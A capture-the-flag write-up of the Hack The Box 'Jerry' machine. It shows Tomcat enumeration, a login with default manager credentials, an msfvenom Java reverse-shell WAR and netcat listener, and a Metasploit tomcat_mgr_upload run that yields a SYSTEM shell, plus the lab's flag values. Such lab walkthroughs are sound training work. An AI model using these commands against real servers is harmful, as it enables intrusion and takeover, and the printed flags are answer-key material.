---
date: 2022-12-08
title: Jerry HTB Write-Up
machine_ip: 10.10.10.95
os: Windows
difficulty: Easy
my_rating: 3
tags:
  - "#Apache"
  - Web
  - RCE
  - FileUpload
  - DefaultCred
  - Java
references: "[[📚CTF Box Writeups]]"
---
## Enumeration

Used to gather usernames, group names, hostnames, network shares and services, IP tables and routing tables, etc.

### Masscan

A walkthrough was referenced throughout this attack.

Perform enumeration on port scanning in bulk, masscan is faster than nmap but nmap is more verbose. Flag -p listens to a specific port. In this instance, port 80 (http).

{% code overflow="wrap" lineNumbers="true" %}
```
└─# masscan -p80 10.10.10.95
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-12-08 04:10:34 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [1 port/host]
```
{% endcode %}

### Nmap

Provides features like port scanning, network scanning, vulnerability scanning, os detection, service version detection, system bios scanning, etc. Flags are used to provide more data. -sC for default script, -sV probe for version of open ports, -oA output in 3 major formats.

{% code overflow="wrap" lineNumbers="true" %}
```bash
└─# nmap -sC -sV -oA htb/jerry 10.10.10.95
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-08 03:37 UTC
Nmap scan report for 10.10.10.95
Host is up (0.072s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.36 seconds
```
{% endcode %}

## Exploitation

Take action on the identified vulnerabilities during the enumeration and exploit.

### Apache Tomcat - Manager App

A "pure Java" HTTP web server environment with vulnerabilities to exploit.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-08 074549 (1).png" alt=""><figcaption><p>10.10.10.95:8080 port that was identified as open from nmap is accessible via web browser. Attempting to login to the Manager App.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-08 075103.png" alt=""><figcaption><p>Manager App login window. Don't know password so click Cancel.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-08 075348.png" alt=""><figcaption><p>401 Unauthorized page shows example login information we can try for the Manager-gui role. We will now try username="tomcat" password="s3cret" for the Manager App.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-08 075858.png" alt=""><figcaption><p>The login credentials worked and now we have access to the Tomcat Apache Manager App</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-08 081116.png" alt=""><figcaption><p>Mnager App has a WAR file to deploy field. This is an attack vector for a payload we can use by generateing a payload with msfvenom.</p></figcaption></figure>

### msfvenom (without Metasploit Framework)

Combination of msfpayload and msfencode. Generates payloads to be deployed at the target system (using the msfconsole). The flag -p is set to specify it is a payload command.

The below code specifies msfvenom to create a java payload my local IP listening on port 4545 to gain reverse shell access as a .war file.

{% code overflow="wrap" lineNumbers="true" %}
```
└─# msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4545 -f war -o shell.war
Payload size: 13317 bytes
Final size of war file: 13317 bytes
Saved as: shell.war
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-08 082816.png" alt=""><figcaption><p>Deploy the shell.war payload</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-08 081953.png" alt=""><figcaption><p>shell.war was deployed and now is a running application in the Manager App</p></figcaption></figure>

### netcat (nc)

Reads and writes data across network connections, using TCP and UDP protocols. It can also function as a server, by listening for inbound connections on arbitrary ports and then doing the same reading and writing. The flag -lvp is set to listen mode for inbound connects, verbose, and local port number.

The command below listens to the specified port 4545 in the payload. We have shell access to apache-tomcat-7.0.88.

{% code overflow="wrap" lineNumbers="true" %}
```
└─# nc -lvp 4545                          
listening on [any] 4545 ...
10.10.10.95: inverse host lookup failed: Unknown host
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```
{% endcode %}

Check who we are logged in as, and it is "nt authority\system". This is the highest authority on the server.

{% code overflow="wrap" lineNumbers="true" %}
```
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```
{% endcode %}

Search for flags, since we are the authority user on the Windows machine. Change directory to Users, find Admin, search for flags folder.

{% code overflow="wrap" lineNumbers="true" %}
```
C:\apache-tomcat-7.0.88>cd ..
cd ..

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\

06/19/2018  03:07 AM    <DIR>          apache-tomcat-7.0.88
08/22/2013  05:52 PM    <DIR>          PerfLogs
06/19/2018  05:42 PM    <DIR>          Program Files
06/19/2018  05:42 PM    <DIR>          Program Files (x86)
06/18/2018  10:31 PM    <DIR>          Users
01/21/2022  08:53 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   2,365,743,104 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users

06/18/2018  10:31 PM    <DIR>          .
06/18/2018  10:31 PM    <DIR>          ..
06/18/2018  10:31 PM    <DIR>          Administrator
08/22/2013  05:39 PM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)   2,365,743,104 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator

06/18/2018  10:31 PM    <DIR>          .
06/18/2018  10:31 PM    <DIR>          ..
06/19/2018  05:43 AM    <DIR>          Contacts
06/19/2018  06:09 AM    <DIR>          Desktop
06/19/2018  05:43 AM    <DIR>          Documents
01/21/2022  08:23 PM    <DIR>          Downloads
06/19/2018  05:43 AM    <DIR>          Favorites
06/19/2018  05:43 AM    <DIR>          Links
06/19/2018  05:43 AM    <DIR>          Music
06/19/2018  05:43 AM    <DIR>          Pictures
06/19/2018  05:43 AM    <DIR>          Saved Games
06/19/2018  05:43 AM    <DIR>          Searches
06/19/2018  05:43 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   2,365,743,104 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)   2,365,743,104 bytes free

C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,365,743,104 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```
{% endcode %}

Flags for User and Root are identified.

### msfconsole (with Metasploit Framework)

Metasploit Framework is a tool that identifies systematic vulnerabilities on servers and networks. Works with different operating systems and is open-source.

Type the use command to navigate to the tomcat manager upload http. Set the http password and username, rhosts, rport, lhost, and run. Search for flags by changing directory.

{% code overflow="wrap" lineNumbers="true" %}
```
└─# msfconsole                                                                        
                                                  
     ,           ,
    /             \                                                                                             
   ((__---,,,---__))                                                                                            
      (_) O O (_)_________                                                                                      
         \ _ /            |\                                                                                    
          o_o \   M S F   | \                                                                                   
               \   _____  |  *                                                                                  
                |||   WW|||                                                                                     
                |||     |||                                                                                     
                                                                                                                

       =[ metasploit v6.1.27-dev                          ]
+ -- --=[ 2196 exploits - 1162 auxiliary - 400 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use help <command> to learn more 
about any command

msf6 > use multi/http/tomcat_mgr_upload
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > set httppassword s3cret
httppassword => s3cret
msf6 exploit(multi/http/tomcat_mgr_upload) > set HTTPUSERNAME tomcat
HTTPUSERNAME => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set rhosts 10.10.10.95
rhosts => 10.10.10.95
msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 8080
rport => 8080
msf6 exploit(multi/http/tomcat_mgr_upload) > set lhost 10.10.14.5
lhost => 10.10.14.5
msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying x33cL8kIeN...
[*] Executing x33cL8kIeN...
[*] Sending stage (58053 bytes) to 10.10.10.95
[*] Undeploying x33cL8kIeN ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.95:49193 ) at 2022-12-08 17:10:17 +0000

meterpreter > dir
Listing: C:\apache-tomcat-7.0.88
================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100776/rwxrwxrw-  57896  fil   2018-05-07 11:16:00 +0000  LICENSE
100776/rwxrwxrw-  1275   fil   2018-05-07 11:16:00 +0000  NOTICE
100776/rwxrwxrw-  9600   fil   2018-05-07 11:16:00 +0000  RELEASE-NOTES
100776/rwxrwxrw-  17454  fil   2018-05-07 11:16:00 +0000  RUNNING.txt
040776/rwxrwxrw-  8192   dir   2018-06-19 01:06:55 +0000  bin
040776/rwxrwxrw-  4096   dir   2018-06-19 03:47:35 +0000  conf
040776/rwxrwxrw-  8192   dir   2018-06-19 01:06:55 +0000  lib
040776/rwxrwxrw-  16384  dir   2022-12-08 23:17:15 +0000  logs
040776/rwxrwxrw-  0      dir   2022-12-09 00:10:13 +0000  temp
040776/rwxrwxrw-  4096   dir   2022-12-09 00:10:14 +0000  webapps
040776/rwxrwxrw-  0      dir   2018-06-19 01:34:12 +0000  work

meterpreter > cd ..
meterpreter > dir
Listing: C:\
============

Mode              Size       Type  Last modified              Name
----              ----       ----  -------------              ----
040777/rwxrwxrwx  0          dir   2013-08-22 15:50:45 +0000  $Recycle.Bin
100777/rwxrwxrwx  1          fil   2013-06-18 12:18:29 +0000  BOOTNXT
040776/rwxrwxrw-  4096       dir   2018-06-18 20:31:25 +0000  Documents and Settings
040776/rwxrwxrw-  0          dir   2013-08-22 15:52:33 +0000  PerfLogs
040776/rwxrwxrw-  4096       dir   2018-06-19 15:42:35 +0000  Program Files
040776/rwxrwxrw-  4096       dir   2018-06-19 15:42:35 +0000  Program Files (x86)
040777/rwxrwxrwx  4096       dir   2022-01-21 18:53:08 +0000  ProgramData
040777/rwxrwxrwx  0          dir   2018-06-18 20:23:35 +0000  System Volume Information
040776/rwxrwxrw-  4096       dir   2018-06-18 20:31:25 +0000  Users
040776/rwxrwxrw-  24576      dir   2022-01-21 18:53:16 +0000  Windows
040776/rwxrwxrw-  4096       dir   2018-06-19 01:07:05 +0000  apache-tomcat-7.0.88
100555/r-xr-xr-x  427680     fil   2013-08-22 05:31:45 +0000  bootmgr
100001/--------x  738197504  fil   1970-01-01 00:00:00 +0000  pagefile.sys

meterpreter > cd Users
meterpreter > dir
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040776/rwxrwxrw-  8192  dir   2018-06-18 20:31:28 +0000  Administrator
040777/rwxrwxrwx  4096  dir   2022-01-21 18:53:08 +0000  All Users
040777/rwxrwxrwx  8192  dir   2013-08-22 16:08:06 +0000  Default
040777/rwxrwxrwx  8192  dir   2013-08-22 16:08:06 +0000  Default User
040776/rwxrwxrw-  4096  dir   2013-08-22 15:39:32 +0000  Public
100777/rwxrwxrwx  174   fil   2013-08-22 15:37:57 +0000  desktop.ini

meterpreter > cd Administrator
meterpreter > dir
Listing: C:\Users\Administrator
===============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2018-06-18 20:31:25 +0000  AppData
040776/rwxrwxrw-  0       dir   2018-06-19 01:32:11 +0000  Application Data
040776/rwxrwxrw-  0       dir   2018-06-19 03:43:09 +0000  Contacts
040777/rwxrwxrwx  4096    dir   2018-06-19 15:48:37 +0000  Cookies
040776/rwxrwxrw-  0       dir   2018-06-19 04:09:30 +0000  Desktop
040776/rwxrwxrw-  0       dir   2018-06-19 03:43:09 +0000  Documents
040776/rwxrwxrw-  0       dir   2022-01-21 18:23:47 +0000  Downloads
040776/rwxrwxrw-  0       dir   2018-06-19 03:43:09 +0000  Favorites
040776/rwxrwxrw-  0       dir   2018-06-19 03:43:09 +0000  Links
040776/rwxrwxrw-  4096    dir   2022-01-21 18:19:44 +0000  Local Settings
040776/rwxrwxrw-  0       dir   2018-06-19 03:43:09 +0000  Music
040776/rwxrwxrw-  4096    dir   2018-06-19 03:43:09 +0000  My Documents
100777/rwxrwxrwx  524288  fil   2022-12-08 10:30:10 +0000  NTUSER.DAT
100777/rwxrwxrwx  65536   fil   2018-06-18 20:39:19 +0000  NTUSER.DAT{bfa35aa3-0b43-11e3-93fa-782bcb3a0757}.TM
                                                           .blf
100777/rwxrwxrwx  524288  fil   2018-06-18 20:39:19 +0000  NTUSER.DAT{bfa35aa3-0b43-11e3-93fa-782bcb3a0757}.TM
                                                           Container00000000000000000001.regtrans-ms
100777/rwxrwxrwx  524288  fil   2018-06-18 20:39:19 +0000  NTUSER.DAT{bfa35aa3-0b43-11e3-93fa-782bcb3a0757}.TM
                                                           Container00000000000000000002.regtrans-ms
040776/rwxrwxrw-  0       dir   2013-08-22 15:39:30 +0000  NetHood
040776/rwxrwxrw-  0       dir   2018-06-19 03:43:09 +0000  Pictures
040776/rwxrwxrw-  0       dir   2013-08-22 15:39:30 +0000  PrintHood
040776/rwxrwxrw-  4096    dir   2018-06-19 15:00:58 +0000  Recent
040776/rwxrwxrw-  0       dir   2018-06-19 03:43:09 +0000  Saved Games
040776/rwxrwxrw-  0       dir   2018-06-19 03:43:09 +0000  Searches
040776/rwxrwxrw-  4096    dir   2013-08-22 15:39:32 +0000  SendTo
040776/rwxrwxrw-  0       dir   2018-06-19 03:43:09 +0000  Start Menu
040776/rwxrwxrw-  0       dir   2013-08-22 15:39:30 +0000  Templates
040776/rwxrwxrw-  0       dir   2018-06-19 03:43:09 +0000  Videos
100777/rwxrwxrwx  286720  fil   2018-06-18 20:31:25 +0000  ntuser.dat.LOG1
100777/rwxrwxrwx  49152   fil   2018-06-18 20:31:25 +0000  ntuser.dat.LOG2
100777/rwxrwxrwx  20      fil   2018-06-18 20:31:25 +0000  ntuser.ini

meterpreter > cd Desktop
dmeterpreter > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100777/rwxrwxrwx  282   fil   2018-06-19 03:43:09 +0000  desktop.ini
040776/rwxrwxrw-  0     dir   2018-06-19 04:09:40 +0000  flags

meterpreter > cd flags
meterpreter > cat "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e


```
{% endcode %}

Flags for User and Root identified.
